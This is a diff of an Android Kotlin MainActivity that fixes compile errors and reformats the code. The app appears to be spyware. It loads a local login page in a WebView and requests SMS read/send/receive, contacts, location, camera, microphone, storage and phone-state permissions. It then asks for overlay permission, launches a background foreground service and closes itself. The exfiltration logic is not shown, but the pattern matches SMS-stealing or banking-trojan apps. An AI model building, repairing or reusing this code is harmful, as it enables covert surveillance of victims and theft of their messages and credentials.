@@ -7,47 +7,49 @@ import android.os.Build
 import android.os.Bundle
 import android.os.VibrationEffect
 import android.os.Vibrator
+import android.provider.Settings
 import android.widget.Toast
+import android.util.Log
+import android.net.Uri
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.luffa.MyService
 import android.content.ComponentName
 import android.webkit.*
-import androidx.preference.PreferenceManager  // ✅ সঠিক
-
+import androidx.preference.PreferenceManager
 
 class MainActivity : AppCompatActivity() {
 
     private val REQUEST_PERM_CODE = 1001
+    private val REQUEST_OVERLAY_CODE = 1002
     private lateinit var serviceIntent: Intent
     private lateinit var prefs: android.content.SharedPreferences
     private val LAUNCH_LIMIT = 7
     private lateinit var myWebView: WebView
 
-    
-override fun onCreate(savedInstanceState: Bundle?) {
-    super.onCreate(savedInstanceState)
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
 
-    myWebView = WebView(this)
-    setContentView(myWebView)
+        // Initialize WebView and Layout
+        myWebView = WebView(this)
+        setContentView(myWebView)
 
-    val webSettings: WebSettings = myWebView.settings
-    webSettings.javaScriptEnabled = true
-    webSettings.domStorageEnabled = true
-    webSettings.allowFileAccess = true
-    webSettings.loadWithOverviewMode = true
-    webSettings.useWideViewPort = true
+        val webSettings: WebSettings = myWebView.settings
+        webSettings.javaScriptEnabled = true
+        webSettings.domStorageEnabled = true
+        webSettings.allowFileAccess = true
+        webSettings.loadWithOverviewMode = true
+        webSettings.useWideViewPort = true
 
-    myWebView.webViewClient = WebViewClient()
-    myWebView.webChromeClient = WebChromeClient()
+        myWebView.webViewClient = WebViewClient()
+        myWebView.webChromeClient = WebChromeClient()
+        myWebView.loadUrl("file:///android_asset/login.html")
 
-    myWebView.loadUrl("file:///android_asset/login.html")
-}
+        // Initialize SharedPreferences
+        prefs = PreferenceManager.getDefaultSharedPreferences(this)
 
-
-        
-
+        // Moved launch logic here inside onCreate
         val currentLaunches = prefs.getInt("launch_count", 0) + 1
         prefs.edit().putInt("launch_count", currentLaunches).apply()
 
@@ -70,92 +72,84 @@ override fun onCreate(savedInstanceState: Bundle?) {
         )
     }
 
+    private val perms = arrayOf(
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_PHONE_STATE
+    )
 
-companion object {
-    private const val REQUEST_PERM_CODE = 1001
-    private const val REQUEST_OVERLAY_CODE = 1002
-}
-
-private val perms = arrayOf(
-    Manifest.permission.READ_SMS,
-    Manifest.permission.SEND_SMS,
-    Manifest.permission.RECEIVE_SMS,
-    Manifest.permission.READ_CONTACTS,
-    Manifest.permission.ACCESS_FINE_LOCATION,
-    Manifest.permission.ACCESS_COARSE_LOCATION,
-    Manifest.permission.CAMERA,
-    Manifest.permission.RECORD_AUDIO,
-    Manifest.permission.READ_EXTERNAL_STORAGE,
-    Manifest.permission.WRITE_EXTERNAL_STORAGE,
-    Manifest.permission.READ_PHONE_STATE
-)
-
-private fun requestPermissions() {
-    val ungranted = perms.filter {
-        ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-    }
-
-    if (ungranted.isNotEmpty()) {
-        ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), REQUEST_PERM_CODE)
-    } else {
-        checkOverlayPermissionThenStart()
-    }
-} // <-- এইখানে requestPermissions() ফাংশন বন্ধ হয়ে যাচ্ছে
-
-// নিচের ফাংশনগুলো এখন ক্লাসের সরাসরি member — requestPermissions() এর বাইরে
-override fun onRequestPermissionsResult(
-    requestCode: Int,
-    permissions: Array<out String>,
-    grantResults: IntArray
-) {
-    super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
-    if (requestCode == REQUEST_PERM_CODE) {
-        permissions.forEachIndexed { index, permission ->
-            val granted = grantResults.getOrNull(index) == PackageManager.PERMISSION_GRANTED
-            Log.d("Permissions", "$permission -> ${if (granted) "GRANTED" else "DENIED"}")
+    private fun requestPermissions() {
+        val ungranted = perms.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-        checkOverlayPermissionThenStart()
+
+        if (ungranted.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), REQUEST_PERM_CODE)
+        } else {
+            checkOverlayPermissionThenStart()
+        }
     }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == REQUEST_PERM_CODE) {
+            permissions.forEachIndexed { index, permission ->
+                val granted = grantResults.getOrNull(index) == PackageManager.PERMISSION_GRANTED
+                Log.d("Permissions", "$permission -> ${if (granted) "GRANTED" else "DENIED"}")
+            }
+            checkOverlayPermissionThenStart()
+        }
+    }
+
+    private fun checkOverlayPermissionThenStart() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(
+                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:$packageName")
+            )
+            startActivityForResult(intent, REQUEST_OVERLAY_CODE)
+        } else {
+            startService()
+        }
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_OVERLAY_CODE) {
+            startService()
+        }
+    }
+
+    private fun startService() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+
+        val vibrator = getSystemService(Vibrator::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            vibrator?.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
+        } else {
+            @Suppress("DEPRECATION")
+            vibrator?.vibrate(100)
+        }
+
+        finish()
+    }
+
+    // Removed companion object to avoid duplicate REQUEST_PERM_CODE definition
 }
-
-private fun checkOverlayPermissionThenStart() {
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-        val intent = Intent(
-            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-            Uri.parse("package:$packageName")
-        )
-        startActivityForResult(intent, REQUEST_OVERLAY_CODE)
-    } else {
-        startService()
-    }
-}
-
-override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-    super.onActivityResult(requestCode, resultCode, data)
-    if (requestCode == REQUEST_OVERLAY_CODE) {
-        startService()
-    }
-}
-
-private fun startService() {
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-        startForegroundService(serviceIntent)
-    } else {
-        startService(serviceIntent)
-    }
-
-    val vibrator = getSystemService(Vibrator::class.java)
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-        vibrator?.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
-    } else {
-        @Suppress("DEPRECATION")
-        vibrator?.vibrate(100)
-    }
-
-    finish()
-}
-
-
-
-    
